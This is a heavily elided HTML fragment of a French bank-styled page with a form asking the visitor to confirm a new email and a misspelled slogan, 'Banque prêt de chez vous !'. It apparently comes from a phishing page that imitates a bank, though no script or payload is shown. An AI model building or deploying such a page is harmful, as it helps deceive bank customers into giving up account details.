...
<body>
   <div id="container">
      ...
      <form name="Layer1" method="post" action="" enctype="text/plain" id="Layer1">
         ...
         <input type="email" id="Editbox1" name="newmail12" value="" tabindex="3" placeholder="Confirmer nouveau email*">
         <div id="wb_Text1">
      ...
      <div id="Divi">
         <div id="head">
            ...
            <div id="wb_local">
               <div id="wb_uid1"><span id="wb_uid2"><a href="./../agences/">Banque prêt de chez vous&nbsp;!</a></span></div>
            </div>
            <div id="wb_icolocal">
